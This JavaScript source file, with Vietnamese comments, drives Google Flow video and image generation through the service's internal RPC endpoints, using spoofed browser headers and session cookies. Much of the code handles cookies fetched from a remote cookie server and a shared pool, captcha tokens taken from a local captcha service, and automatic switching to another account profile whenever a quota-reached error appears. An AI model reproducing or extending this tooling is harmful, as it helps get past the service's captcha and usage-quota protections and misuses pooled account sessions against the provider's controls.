// opts.retry=false: không thử lại (dùng cho lệnh tạo video — captcha chỉ dùng được 1 lần, tránh tạo trùng)
async function flowBatchExecute(ctx, rpcId, args, sourcePath = "/", opts = {}) {
  const attempt = async (force) => {
    const s = await getFlowSession(ctx, force);
    const prefix = flowUserPrefix(ctx.authUser);
    flowReqCounter += 100000;
    const url =
      `${FLOW_ORIGIN}${prefix}${FLOW_RPC_PATH}?rpcids=${rpcId}` +
      `&source-path=${encodeURIComponent(prefix + sourcePath)}` +
      `&bl=${encodeURIComponent(s.bl)}&f.sid=${encodeURIComponent(s.fsid)}&hl=vi&_reqid=${flowReqCounter}&rt=c`;
    const body =
      "f.req=" + encodeURIComponent(JSON.stringify([[[rpcId, JSON.stringify(args), null, "generic"]]])) +
      "&at=" + encodeURIComponent(s.at) + "&";
    const res = await flowFetch(url, {
      method: "POST",
      headers: {
        accept: "*/*",
        "accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
        "content-type": "application/x-www-form-urlencoded;charset=utf-8",
        priority: "u=1, i",
        "x-same-domain": "1",
        "x-browser-channel": "stable",
        "x-browser-copyright": "Copyright 2026 Google LLC. All Rights Reserved.",
        "x-browser-year": "2026",
        "x-sec-ch-ua-not-a-border": "tsfetsxqfggrssesqzsazgrbdgvrwrbs",
        "user-agent": FLOW_UA,
        cookie: ctx.value,
        Referer: `${FLOW_ORIGIN}/`,
      },
      body,
    });
    const text = await res.text();
    if (!res.ok) {
      const isAuthStatus = res.status === 401 || (res.status === 400 && /unauthenticated|session|login|expired/i.test(text));
      const httpErr = new Error(`${isAuthStatus ? "401: " : ""}${rpcId} HTTP ${res.status}: ${text.substring(0, 200)}`);
      httpErr.statusCode = isAuthStatus ? 401 : res.status;
      httpErr.status = isAuthStatus ? 401 : res.status;
      if (res.status === 429) httpErr.isQuotaError = true;
      throw httpErr;
    }
    for (const line of text.replace(/^\)\]\}'\s*/, "").split("\n")) {
      const t = line.trim();
      if (!t.startsWith("[")) continue;
      let frames;
      try { frames = JSON.parse(t); } catch (e) { continue; }
      for (const f of Array.isArray(frames) ? frames : []) {
        if (!Array.isArray(f)) continue;
        if (f[0] === "wrb.fr" && f[1] === rpcId) {
          if (typeof f[2] === "string") {
            try { return JSON.parse(f[2]); } catch (e) { return f[2]; }
          }
          const fStr = JSON.stringify(f);
          const isQuotaFrame = /PUBLIC_ERROR_USER_QUOTA_REACHED|QUOTA_REACHED|RESOURCE_EXHAUSTED|RATE_LIMIT/i.test(fStr) || f[5] === 8 || (Array.isArray(f[5]) && f[5][0] === 8);
          const isAuthFrame = /UNAUTHENTICATED|generic::unauthenticated/i.test(fStr) || f[5] === 16 || (Array.isArray(f[5]) && f[5][0] === 16);
          const err = new Error(`${isQuotaFrame ? "429: " : isAuthFrame ? "401: " : ""}${rpcId} lỗi: ${fStr.substring(0, 300)}`);
          if (isQuotaFrame) {
            err.statusCode = 429;
            err.status = 429;
            err.isQuotaError = true;
          } else if (isAuthFrame) {
            err.statusCode = 401;
            err.status = 401;
          }
          throw err;
        }
        if (f[0] === "er") {
          const fStr = JSON.stringify(f);
          const isQuotaFrame = /PUBLIC_ERROR_USER_QUOTA_REACHED|QUOTA_REACHED|RESOURCE_EXHAUSTED|RATE_LIMIT/i.test(fStr) || f[5] === 8 || (Array.isArray(f[5]) && f[5][0] === 8);
          const isAuthFrame = /UNAUTHENTICATED|generic::unauthenticated/i.test(fStr) || f[5] === 16 || (Array.isArray(f[5]) && f[5][0] === 16);
          const err = new Error(`${isQuotaFrame ? "429: " : isAuthFrame ? "401: " : ""}${rpcId} lỗi: ${fStr.substring(0, 300)}`);
          if (isQuotaFrame) {
            err.statusCode = 429;
            err.status = 429;
            err.isQuotaError = true;
          } else if (isAuthFrame) {
            err.statusCode = 401;
            err.status = 401;
          }
          throw err;
        }
      }
    }
    throw new Error(`${rpcId} không có dữ liệu: ${text.substring(0, 200)}`);
  };
  if (opts.retry === false) return await attempt(false);
  try {
    return await attempt(false);
  } catch (err) {
    if (err.isQuotaError || err.statusCode === 429) throw err;
    console.warn(`[FlowRPC] ${rpcId} lần 1 lỗi (${err.message}), làm mới at token và thử lại...`);
    return await attempt(true);
  }
}

function flowFindUuids(o, out = []) {
  if (typeof o === "string") {
    const m = o.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi);
    if (m) out.push(...m);
  } else if (Array.isArray(o)) {
    for (const v of o) flowFindUuids(v, out);
  } else if (o && typeof o === "object") {
    for (const v of Object.values(o)) flowFindUuids(v, out);
  }
  return out;
}

// UpteDb: danh sách project (mới nhất trước) -> [{ id, title, createdAt(giây) }]
async function flowListProjects(ctx, pageSize = 21) {
  const data = await flowBatchExecute(ctx, "UpteDb", ["projects/*", pageSize, null, null, null, null, [1]], "/");
  const rows = Array.isArray(data) && Array.isArray(data[0]) ? data[0] : [];
  return rows
    .filter((r) => Array.isArray(r) && typeof r[0] === "string")
    .map((r) => ({
      id: r[0].replace(/^projects\//, ""),
      title: Array.isArray(r[1]) ? r[1][0] : null,
      createdAt: Array.isArray(r[1]) && Array.isArray(r[1][2]) ? Number(r[1][2][0]) || 0 : 0,
    }));
}

function flowDefaultProjectTitle() {
  const d = new Date();
  const p2 = (n) => String(n).padStart(2, "0");
  return `Tháng ${d.getMonth() + 1} ${d.getDate()} - ${p2(d.getHours())}:${p2(d.getMinutes())}`;
}

// jHPbke (tạo project) + UpteDb (lấy UUID project vừa tạo)
// cookie: cookie đang dùng trong pool (kinxcookie) — ưu tiên dùng để project cùng tài khoản với lệnh tạo video
async function flowCreateProject(authToken, projectTitle, cookie = null) {
  const title = projectTitle || flowDefaultProjectTitle();
  if (authToken) global.flowServerAuthToken = String(authToken).replace(/^Bearer\s+/i, "").trim();
  const startedAt = Math.floor(Date.now() / 1000) - 120;
  const createArgs = ["projects/*", [null, [title]], [null, 22]];
  // Lần 1: cookie hiện tại; Lần 2: nếu cookie lỗi xác thực/SNlM0e thì gọi kinxcookie.php?401 để cấp cookie mới
  const tried = new Set();
  let ctx = null;
  let created;
  let lastErr = null;
  for (const force of [false, true]) {
    const forceReason = force ? "401" : "";
    for (const cand of await flowResolveCookies(cookie, authToken, force, forceReason)) {
      if (tried.has(cand.value)) continue;
      tried.add(cand.value);
      try {
        created = await flowBatchExecute(cand, "jHPbke", createArgs, "/");
        ctx = cand;
        break;
      } catch (err) {
        lastErr = err;
        console.warn(`[FlowRPC] jHPbke lỗi (${err.message})${force ? "" : ", đang gọi kinxcookie.php?401 để lấy cookie mới..."}`);
      }
    }
    if (ctx) break;
  }
  if (!ctx) throw lastErr || new Error("401: Không có cookie Flow hợp lệ để tạo project");
  if (cookie && typeof cookie === "object" && ctx.value) {
    if (typeof cookie.value === "string" && cookie.value !== ctx.value) cookie.value = ctx.value;
    if (typeof cookie.cookie === "string" && cookie.cookie !== ctx.value) cookie.cookie = ctx.value;
    if (ctx.bearerToken) cookie.bearerToken = ctx.bearerToken;
  }
  const createdId = flowFindUuids(created)[0] || null;

  let projectId = null;
  for (let i = 0; i < 3 && !projectId; i++) {
    if (i > 0) await flowSleep(1500);
    let list = [];
    try { list = await flowListProjects(ctx); } catch (e) { console.warn(`[FlowRPC] UpteDb lỗi: ${e.message}`); }
    if (createdId && list.some((p) => p.id === createdId)) projectId = createdId;
    else {
      const match = list.find((p) => p.title === title && (!p.createdAt || p.createdAt >= startedAt));
      if (match) projectId = match.id;
      else if (i === 2) projectId = createdId || (list[0] && list[0].id) || null;
    }
  }
  if (!projectId) throw new Error("Flow jHPbke/UpteDb không trả về UUID project");
  console.log(`[FlowRPC] Tạo project thành công: ${projectId} (${title})`);
  const accKey = (cookie && flowCookieAccountKey(typeof cookie === "string" ? cookie : cookie.value)) || "default";
  const ctxKey = (ctx && flowCookieAccountKey(ctx.value)) || null;
  const cookieKey = (cookie && flowCookieAccountKey(typeof cookie === "string" ? cookie : cookie.value)) || null;
  global.flowSharedProjectMap = global.flowSharedProjectMap || new Map();
  global.flowSharedProjectMap.set(accKey, projectId);
  if (ctxKey) global.flowSharedProjectMap.set(ctxKey, projectId);
  if (cookieKey) global.flowSharedProjectMap.set(cookieKey, projectId);
  if (!ctxKey && !cookieKey) global.flowSharedProjectMap.set("default", projectId);
  return projectId;
}

// ===== [FLOW SHARED PROJECT FOR VIDEO & IMAGE] =====
// Cơ chế tạo và dùng chung project giữa Tạo Video và Tạo Ảnh trên flow.google.com
global.flowSharedProjectMap = global.flowSharedProjectMap || new Map();

async function flowGetOrCreateSharedProject(cookieVal, authToken = null) {
  const accKey = flowCookieAccountKey(cookieVal) || "default";

  // 1. Kiểm tra cache shared map
  if (global.flowSharedProjectMap && global.flowSharedProjectMap.has(accKey)) {
    const cachedId = global.flowSharedProjectMap.get(accKey);
    if (cachedId && isFlowUuid(cachedId)) return cachedId;
  }

  // 2. Kiểm tra trong pool video (global.veoCookieCache) - cơ chế dùng chung với tạo video
  if (Array.isArray(global.veoCookieCache)) {
    for (const item of global.veoCookieCache) {
      if (!item) continue;
      const itemCookie = typeof item.cookie === "string" ? item.cookie : item.cookie?.value;
      if (itemCookie && (flowCookieAccountKey(itemCookie) === accKey || accKey === "default")) {
        const pId = item.projectId || item.imgProjectId || item.vidProjectId;
        if (pId && isFlowUuid(pId)) {
          console.log(`[FlowProject] Dùng chung project từ pool video: ${pId}`);
          global.flowSharedProjectMap.set(accKey, pId);
          return pId;
        }
      }
    }
  }

  const ctx = normalizeFlowCookie(cookieVal);

  // 3. Lấy project gần nhất đã có trên flow.google.com
  try {
    const list = await flowListProjects(ctx, 3);
    if (Array.isArray(list) && list.length > 0 && list[0]?.id && isFlowUuid(list[0].id)) {
      const pId = list[0].id;
      console.log(`[FlowProject] Dùng project đã có trên Flow: ${pId} (${list[0].title || ""})`);
      global.flowSharedProjectMap.set(accKey, pId);
      return pId;
    }
  } catch (e) {
    console.warn(`[FlowProject] flowListProjects lỗi (${e.message}), chuyển sang tạo mới...`);
  }

  // 4. Nếu chưa có, tạo project mới qua Flow RPC (jHPbke + UpteDb)
  try {
    const token = authToken || global.flowServerAuthToken;
    const newId = await flowCreateProject(token, flowDefaultProjectTitle(), cookieVal);
    if (newId && isFlowUuid(newId)) {
      console.log(`[FlowProject] Tạo mới project Flow thành công: ${newId}`);
      global.flowSharedProjectMap.set(accKey, newId);
      return newId;
    }
  } catch (err) {
    console.error(`[FlowProject] Lỗi tạo project Flow: ${err.message}`);
  }

  return null;
}

// as29s: lấy link media (ưu tiên video flow-content.google) theo media name/UUID
function flowPickMediaUrl(o, type = "any") {
  const urls = [];
  const walk = (v) => {
    if (typeof v === "string") {
      if (/^https?:\/\//.test(v)) urls.push(v.replace(/\\u003d/g, "=").replace(/\\u0026/g, "&").replace(/\\\//g, "/"));
    } else if (Array.isArray(v)) v.forEach(walk);
    else if (v && typeof v === "object") Object.values(v).forEach(walk);
  };
  walk(o);
  if (type === "video") {
    return urls.find((u) => u.includes("flow-content.google/video/")) || null;
  }
  if (type === "image") {
    return urls.find((u) => u.includes("flow-content.google/image/")) || null;
  }
  return (
    urls.find((u) => u.includes("flow-content.google/video/")) ||
    urls.find((u) => u.includes("flow-content.google/")) ||
    urls.find((u) => u.includes("storage.googleapis.com/")) ||
    null
  );
}

async function flowGetMediaUrl(mediaName, opts = {}) {
  if (!mediaName) return null;
  let raw = String(mediaName);
  try { if (/^https?:\/\//.test(raw)) raw = new URL(raw).searchParams.get("name") || raw; } catch (e) { }
  const ids = raw.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/gi);
  let mediaId = ids ? ids[ids.length - 1] : raw;

  // Tra cứu xem mediaId có nằm trong cache FlowTrackedVideos (nếu truyền nhầm opName)
  const cleanKey = String(mediaId).toLowerCase().trim();
  if (global.flowTrackedVideos?.has(cleanKey)) {
    const tracked = global.flowTrackedVideos.get(cleanKey);
    if (tracked.videoUrl && (!opts.onlyVideo || tracked.videoUrl.includes("flow-content.google/video/"))) {
      return tracked.videoUrl;
    }
    if (tracked.mediaId && String(tracked.mediaId).toLowerCase().trim() !== cleanKey) {
      mediaId = tracked.mediaId;
    }
  }

  const projectId = opts.projectId ? String(opts.projectId).replace(/^projects\//, "") : null;
  const sourcePath = projectId ? `/project/${projectId}` : "/";

  // Cookie trong pool có thể đã bị server làm mới -> dùng bản mới nhất (kinxcookie.php?reload) nếu cùng tài khoản.
  // Lần 2 ép gọi lại server, bỏ qua cookie đã thử.
  const tried = new Set();
  const getContexts = async function* () {
    for (const force of [false, true]) {
      for (const cand of await flowResolveCookies(opts.cookieHint, opts.authToken, force)) {
        if (tried.has(cand.value)) continue;
        tried.add(cand.value);
        yield cand;
      }
    }
  };

  for await (const ctx of getContexts()) {
    try {
      const data = await flowBatchExecute(ctx, "as29s", [mediaId], sourcePath);
      const url = flowPickMediaUrl(data, opts.onlyVideo ? "video" : "any");
      if (url) {
        console.log(`[FlowRPC] as29s lấy URL media ${mediaId}: ${url.substring(0, 100)}...`);
        return url;
      }
      console.warn(`[FlowRPC] as29s chưa có URL cho media ${mediaId}`);
    } catch (err) {
      console.warn(`[FlowRPC] as29s lỗi (${mediaId}): ${err.message}`);
    }
  }
  return null;
}

// Response giả lập (302 + location) để thay trực tiếp cho proxyFetch(getMediaUrlRedirect)
async function flowMediaRedirectResponse(mediaName, cookieHint, projectId = null) {
  let url = await flowGetMediaUrl(mediaName, { cookieHint, projectId, onlyVideo: true });
  if (!url) {
    url = await flowGetMediaUrl(mediaName, { cookieHint, projectId, onlyVideo: false });
  }
  return {
    ok: !!url,
    status: url ? 302 : 404,
    url: "",
    headers: { get: (k) => (url && String(k).toLowerCase() === "location" ? url : null) },
    text: async () => (url ? "" : "as29s: không lấy được URL media"),
    json: async () => ({ redirectUrl: url }),
  };
}

// Giữ tên hàm cũ cho các call site fallback
async function fetchFlowMediaSignedUrl(mediaId, cookieVal, projectId) {
  try {
    return await flowGetMediaUrl(mediaId, { cookieHint: cookieVal, projectId });
  } catch (e) {
    console.error("[FlowMedia] fetchFlowMediaSignedUrl fail:", e.message);
    return null;
  }
}
// Định kỳ 2 phút: chỉ gọi kinxcookie.php?reload khi trong pool thực sự đang dùng Cookie Server
const flowPoolSyncTimer = setInterval(() => {
  if (!global.flowServerAuthToken || !Array.isArray(global.veoCookieCache) || global.veoCookieCache.length === 0) return;
  if (global.flowServerCookieForbiddenUntil && Date.now() < global.flowServerCookieForbiddenUntil) return;
  const hasServerCookieInPool = global.veoCookieCache.some(
    (item) =>
      item &&
      item.cookie &&
      !isLocalProfileCookie(item.cookie) &&
      !String(item.id || "").startsWith("pool-local-") &&
      !String(item.id || "").startsWith("pool-active-")
  );
  if (!hasServerCookieInPool) return;
  fetchFlowCookieFromServer(null, true).catch((e) => {
    if (!String(e.message || "").includes("HTTP 403")) {
      console.warn(`[FlowRPC] Đồng bộ cookie định kỳ lỗi: ${e.message}`);
    }
  });
}, 2 * 60 * 1000);
if (flowPoolSyncTimer.unref) flowPoolSyncTimer.unref();

// ===== [FLOW VIDEO] Tạo video qua flow.google.com batchexecute (ƯU TIÊN), backup API nội bộ aisandbox =====
//   video:batchAsyncGenerateVideoText             -> YhhmEf (t2v)
//   video:batchAsyncGenerateVideoReferenceImages  -> MZZa6b (r2v - ảnh tham chiếu)
//   video:batchAsyncGenerateVideoStartImage       -> nprQif (i2v - khung đầu)
//   video:batchAsyncGenerateVideoStartAndEndImage -> nprQif (khung đầu + cuối, model interpolation)
// Captcha vẫn lấy từ localhost:3000 (getVeoCaptchaToken) như API nội bộ.
// Kiểm tra trạng thái giữ nguyên batchCheckAsyncVideoGenerationStatus (API nội bộ).
// Flow lỗi -> trả null để WeInternal chạy tiếp API nội bộ.
const FLOW_VIDEO_RPC = {
  batchAsyncGenerateVideoText: "YhhmEf",
  batchAsyncGenerateVideoReferenceImages: "MZZa6b",
  batchAsyncGenerateVideoStartImage: "nprQif",
  batchAsyncGenerateVideoStartAndEndImage: "nprQif",
};
global.flowVideoEnabled = global.flowVideoEnabled !== false; // đặt false để tắt hẳn đường Flow
let flowVideoRawLogged = false;

// ==============================================================================
// CẤU HÌNH MODE _low_priority CHO FLOW VIDEO:
// true  = Tự động thêm hậu tố "_low_priority" sau "_lite" (vd: veo_3_1_t2v_lite_low_priority)
// false = Dùng mode "_lite" chuẩn không có hậu tố (vd: veo_3_1_t2v_lite)
// -> Bạn có thể đổi biến global.flowUseLowPriority thành true hoặc false bất cứ khi nào!
// ==============================================================================
global.flowUseLowPriority = true;

function flowFormatModelKey(modelKey) {
  let m = String(modelKey || "veo_3_1_t2v_lite");
  if (global.flowUseLowPriority) {
    if (m.includes("_lite") && !m.includes("_low_priority")) {
      m = m.replace("_lite", "_lite_low_priority");
    }
  } else {
    m = m.replace(/_low_priority/g, "");
  }
  return m;
}

function flowVideoRpcFor(url) {
  const m = String(url || "").match(/video:(batchAsyncGenerateVideo\w+)/);
  return m ? FLOW_VIDEO_RPC[m[1]] || null : null;
}
const flowUpperUuid = () => require("crypto").randomUUID().toUpperCase();
global.mediaImageSizeCache = global.mediaImageSizeCache || new Map();

// Tính toán tọa độ cropBox chuẩn xác theo kích thước ảnh thực tế và tỉ lệ video mong muốn:
// - Nếu ảnh đã là 9:16 (như frame video nối tiếp) -> cropBox = [null, 0, 1, 1] (dùng trọn 100% ảnh, KHÔNG bị cắt và KHÔNG bị viền đen)
// - Nếu ảnh là 1:1 vuông -> cropBox = [null, 0.21875, 1, 0.78125]
// - Nếu ảnh là 16:9 -> cắt đều 2 bên theo tỷ lệ 9:16 [null, 0.341797, 1, 0.658203]
function computeFlowCropBox(aspectCode, imageWidth, imageHeight) {
  const targetRatio = aspectCode === 1 ? (9 / 16) : (16 / 9);

  if (!imageWidth || !imageHeight || imageWidth <= 0 || imageHeight <= 0) {
    return [null, 0, 1, 1];
  }

  const imgRatio = imageWidth / imageHeight;

  if (Math.abs(imgRatio - targetRatio) / targetRatio < 0.04) {
    return [null, 0, 1, 1];
  }

  if (imgRatio > targetRatio) {
    const visibleWidthFraction = targetRatio / imgRatio;
    const xmin = Number(((1 - visibleWidthFraction) / 2).toFixed(6));
    const xmax = Number((1 - xmin).toFixed(6));
    return [null, xmin, 1, xmax];
  }

  const visibleHeightFraction = imgRatio / targetRatio;
  const ymin = Number(((1 - visibleHeightFraction) / 2).toFixed(6));
  const ymax = Number((1 - ymin).toFixed(6));
  return [ymin, 0, ymax, 1];
}

// Mã tỉ lệ khung hình của Flow: 2 = ngang 16:9, 1 = dọc 9:16
function flowAspectCode(aspectRatio) {
  const str = String(aspectRatio || "").trim();
  if (str === "1") return 1;
  if (str === "2") return 2;
  return /PORTRAIT|9:16|9_16/i.test(str) ? 1 : 2;
}
function flowPromptOf(req) {
  const parts = req?.textInput?.structuredPrompt?.parts;
  const t = Array.isArray(parts) ? parts.map((p) => (p && p.text) || "").join("") : req?.textInput?.prompt || "";
  return String(t || "").trim();
}

// Đổi body API nội bộ -> args batchexecute (theo payload_video.md)
function flowBuildVideoArgs(rpcId, req, bodyObj, captchaToken) {
  const projectId = bodyObj?.clientContext?.projectId;
  const prompt = [null, null, [[[flowPromptOf(req)]]]];
  const aspect = flowAspectCode(req.aspectRatio);
  console.log(`[FlowVideo] RPC ${rpcId} AspectRatio: "${req.aspectRatio}" -> Flow Code: ${aspect} (${aspect === 1 ? "9:16 Khung dọc" : "16:9 Khung ngang"})`);
  const meta = [null, null, null, null, flowUpperUuid(), flowUpperUuid()];
  let model = flowFormatModelKey(req.videoModelKey);
  let item;
  if (rpcId === "MZZa6b") {
    const refs = (req.referenceImages || []).filter((r) => r && r.mediaId).map((r) => [null, r.mediaId]);
    item = [prompt, refs, model, aspect, null, meta];
  } else if (rpcId === "nprQif") {
    // Flow yêu cầu toạ độ cropBox ở phần tử thứ 6 của start/end image:
    // Tự động tính cropBox thông minh chuẩn xác theo kích thước ảnh thực tế và tỉ lệ video:
    // Với ảnh 9:16 (như frame video nối tiếp) -> [null, 0, 1, 1] (dùng 100% ảnh, KHÔNG bị cắt và KHÔNG bị viền đen)
    const startMediaId = req.startImage?.mediaId;
    const endMediaId = req.endImage?.mediaId;
    const startSize = (req.startImage?.width && req.startImage?.height)
      ? { width: req.startImage.width, height: req.startImage.height }
      : (global.mediaImageSizeCache && startMediaId ? (global.mediaImageSizeCache.get(String(startMediaId).toLowerCase()) || global.mediaImageSizeCache.get(String(startMediaId))) : null);
    const startCropBox = req.startImage?.cropBox || computeFlowCropBox(aspect, startSize?.width, startSize?.height);

    const endSize = (req.endImage?.width && req.endImage?.height)
      ? { width: req.endImage.width, height: req.endImage.height }
      : (global.mediaImageSizeCache && endMediaId ? (global.mediaImageSizeCache.get(String(endMediaId).toLowerCase()) || global.mediaImageSizeCache.get(String(endMediaId))) : null);
    const endCropBox = req.endImage?.cropBox || computeFlowCropBox(aspect, endSize?.width, endSize?.height);

    console.log(`[FlowVideo] nprQif CropBox - Aspect: ${aspect} (${aspect === 1 ? "9:16" : "16:9"}), StartImg: ${startSize ? `${startSize.width}x${startSize.height}` : "unknown"} -> CropBox:`, JSON.stringify(startCropBox));

    let start = startMediaId ? [null, startMediaId, null, null, null, startCropBox] : null;
    let end = endMediaId ? [null, endMediaId, null, null, null, endCropBox] : null;
    if (start && !end) end = start;
    if (/_i2v_/.test(model)) model = model.replace("_i2v_", "_interpolation_");
    item = [prompt, model, aspect, null, start, end, meta];
  } else {
    item = [prompt, model, aspect, null, meta];
  }
  const args = [
    [item],
    [null, 22, null, null, null, projectId, null, null, null, null, [captchaToken, 1]],
    [flowUpperUuid(), 1],
  ];
  const ourIds = new Set([...meta.slice(4), args[2][0]].map((x) => x.toLowerCase()));
  return { args, ourIds };
}

// Đổi kết quả Flow -> dạng API nội bộ { media:[{ name, sceneId }], workflows:[{ name }] }
function flowVideoToInternal(data, req, bodyObj, ourIds) {
  const exclude = new Set(
    [
      bodyObj?.clientContext?.projectId,
      req?.startImage?.mediaId,
      req?.endImage?.mediaId,
      ...(req?.referenceImages || []).map((r) => r && r.mediaId),
    ].filter(Boolean).map((x) => String(x).toLowerCase())
  );
  const ids = [...new Set(flowFindUuids(data).map((x) => x.toLowerCase()))].filter((x) => !exclude.has(x));
  const serverIds = ids.filter((x) => !ourIds.has(x));
  const ordered = serverIds.length ? serverIds : ids;
  if (!ordered.length) return null;

  // Cấu trúc Flow: data[3][0][0] là mediaId của video, data[2][0][0] là workflowId / opName
  let explicitMediaId = null;
  if (Array.isArray(data?.[3]?.[0]) && typeof data[3][0][0] === "string" && isFlowUuid(data[3][0][0])) {
    explicitMediaId = data[3][0][0].toLowerCase().trim();
  }
  let explicitOpName = null;
  if (Array.isArray(data?.[2]?.[0]) && typeof data[2][0][0] === "string" && isFlowUuid(data[2][0][0])) {
    explicitOpName = data[2][0][0].toLowerCase().trim();
  }

  const mediaId = explicitMediaId || ordered.find(x => x !== explicitOpName) || ordered[1] || ordered[0];
  const opName = explicitOpName || ordered[0];
  const workflowName = opName;
  const sceneId = req?.metadata?.sceneId || workflowName;

  return {
    media: [{ name: opName, sceneId, workflowId: workflowName, mediaId: mediaId }],
    workflows: [{ name: workflowName }],
    mediaId,
    candIds: ordered,
    viaFlow: true
  };
}


async function flowTryGenerateVideo(url, cookieObj, body) {
  if (global.isSessionStopped && global.isSessionStopped()) throw new Error("SESSION_STOPPED");
  if (!global.flowVideoEnabled) return null;
  const rpcId = flowVideoRpcFor(url);
  if (!rpcId) return null;
  let bodyObj = body;
  if (typeof body === "string") {
    try { bodyObj = JSON.parse(body); } catch (e) { return null; }
  }
  const req = bodyObj?.requests?.[0];
  const projectId = bodyObj?.clientContext?.projectId;
  const cookieVal = cookieObj && typeof cookieObj === "object" ? cookieObj.value || cookieObj.cookie : typeof cookieObj === "string" ? cookieObj : null;
  if (!req || !projectId || !cookieVal) return null;

  const ctx = normalizeFlowCookie(cookieObj || cookieVal);
  const threadId = bodyObj?.clientContext?.sessionId || bodyObj?.sessionId || "default";
  let tokenUsed = false;
  try {
    await getFlowSession(ctx); // lấy at token TRƯỚC khi xin captcha để không phí captcha
    if (global.isSessionStopped && global.isSessionStopped()) throw new Error("SESSION_STOPPED");
    const cap = await getVeoCaptchaToken("VIDEO_GENERATION", false, threadId, cookieVal);
    if (global.isSessionStopped && global.isSessionStopped()) throw new Error("SESSION_STOPPED");
    const token = cap && typeof cap === "object" ? cap.token : typeof cap === "string" ? cap : null;
    if (!token) throw new Error("không lấy được captcha từ localhost:3000");
    tokenUsed = true;
    const { args, ourIds } = flowBuildVideoArgs(rpcId, req, bodyObj, token);
    console.log(`[FlowVideo] Gửi ${rpcId} (${req.videoModelKey}) project ${projectId}...`);
    const data = await flowBatchExecute(ctx, rpcId, args, `/project/${projectId}`, { retry: false });
    if (global.isSessionStopped && global.isSessionStopped()) throw new Error("SESSION_STOPPED");
    if (!flowVideoRawLogged) {
      flowVideoRawLogged = true;
      console.log(`[FlowVideo] ${rpcId} raw:`, JSON.stringify(data).substring(0, 800));
    }
    const res = flowVideoToInternal(data, req, bodyObj, ourIds);
    if (!res) {
      const rawStr = JSON.stringify(data) || "";
      if (rawStr.includes("PUBLIC_ERROR_USER_QUOTA_REACHED") || rawStr.includes("QUOTA_REACHED") || rawStr.includes("RESOURCE_EXHAUSTED")) {
        console.warn(`[FlowVideo] ${rpcId} phát hiện tài khoản hết credit (PUBLIC_ERROR_USER_QUOTA_REACHED). Không dùng API backup, tự động đổi profile khác!`);
        const quotaErr = new Error("Error 429 - Hết credit tài khoản Google Flow (PUBLIC_ERROR_USER_QUOTA_REACHED)");
        quotaErr.statusCode = 429;
        quotaErr.status = 429;
        quotaErr.isQuotaError = true;
        throw quotaErr;
      }
      /* [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
      // Flow đã nhận lệnh nhưng không đọc được mã video -> tắt đường Flow cho phiên này để tránh tạo trùng nhiều lần
      global.flowVideoEnabled = false;
      console.error(`[FlowVideo] ${rpcId} không đọc được mã video, TẮT Flow cho phiên này. Raw:`, JSON.stringify(data).substring(0, 1500));
      return null;
      */
      console.error(`[FlowVideo] ${rpcId} không đọc được mã video từ Flow API. Raw:`, JSON.stringify(data).substring(0, 1500));
      throw new Error(`Flow API (${rpcId}) không trả về mã tiến trình video.`);
    }
    // Ghi nhận video tạo qua Flow để kích hoạt kiểm tra ngNC2 định kỳ 30s và lấy link qua as29s
    const inputIds = [
      req?.startImage?.mediaId,
      req?.endImage?.mediaId,
      ...(req?.referenceImages || []).map((r) => r && r.mediaId),
    ].filter(Boolean);
    flowRegisterCreatedVideo(res, projectId, cookieVal, inputIds);
    console.log(`[FlowVideo] ${rpcId} OK -> media ${res.media[0].name}`);
    return res;
  } catch (err) {
    const errMsg = String(err.message || "");
    if ((global.isSessionStopped && global.isSessionStopped()) || err.name === "AbortError" || errMsg.includes("SESSION_STOPPED")) {
      throw new Error("SESSION_STOPPED");
    }
    const isQuota = err.isQuotaError || err.statusCode === 429 || errMsg.includes("PUBLIC_ERROR_USER_QUOTA_REACHED") || errMsg.includes("QUOTA_REACHED") || errMsg.includes("RESOURCE_EXHAUSTED");
    if (isQuota) {
      console.warn(`[FlowVideo] ${rpcId} hết credit Flow (QUOTA_REACHED) -> Ném lỗi 429 để hệ thống tự động đổi profile!`);
      const quotaErr = new Error("Error 429 - Hết credit tài khoản Google Flow (PUBLIC_ERROR_USER_QUOTA_REACHED)");
      quotaErr.statusCode = 429;
      quotaErr.status = 429;
      quotaErr.isQuotaError = true;
      throw quotaErr;
    }
    const isAuth = err.statusCode === 401 || errMsg.includes("SNlM0e") || errMsg.includes("401") || errMsg.includes("hết hạn") || errMsg.includes("unauthenticated");
    if (isAuth) {
      console.warn(`[FlowVideo] ${rpcId} lỗi xác thực Flow (${err.message}) -> Ném lỗi 401 để đổi profile, không chạy backup API!`);
      const authErr = new Error(`401: Lỗi xác thực tài khoản Flow (${err.message})`);
      authErr.statusCode = 401;
      authErr.status = 401;
      throw authErr;
    }
    /* [ĐÃ TẮT FALLBACK aisandbox-pa.googleapis.com - CHỈ DÙNG FLOW API]
    console.warn(`[FlowVideo] ${rpcId} lỗi (${err.message}) -> chuyển sang API nội bộ`);
    return null;
    */
    console.error(`[FlowVideo] ${rpcId} lỗi Flow API:`, err.message);
    throw err;
  } finally {
    // Captcha chỉ dùng 1 lần -> xoá cache để API nội bộ (nếu chạy backup) lấy token mới
    if (tokenUsed) threadTokenCache.delete(threadId);
  }
}

// ===== [FLOW IMAGE UPLOAD (maseQ)] =====
// Ưu tiên tải ảnh lên flow.google.com bằng RPC maseQ; nếu lỗi thì chuyển sang API nội bộ backup
async function flowTryUploadImage(url, cookieObj, body) {
  if (!global.flowVideoEnabled) return null;
  let bodyObj = body;
  if (typeof body === "string") {
    try { bodyObj = JSON.parse(body); } catch (e) { return null; }
  }
  const imageBytes = bodyObj?.imageBytes || bodyObj?.image?.imageBytes || bodyObj?.rawBytes || bodyObj?.imageBase64 || (typeof body === "string" && body.includes("base64,") ? body : null);
  const projectIdRaw = bodyObj?.clientContext?.projectId || bodyObj?.projectId || (url ? (url.match(/projects\/([^\/]+)/)?.[1]) : null);
  let cookieVal = cookieObj && typeof cookieObj === "object" ? cookieObj.value || cookieObj.cookie : typeof cookieObj === "string" ? cookieObj : null;
  if (!cookieVal) {
    try {
      const serverCtx = await fetchFlowCookieFromServer(global.flowServerAuthToken, false);
      if (serverCtx && serverCtx.value) cookieVal = serverCtx.value;
    } catch (e) { }
  }
  if (!imageBytes || !cookieVal) return null;

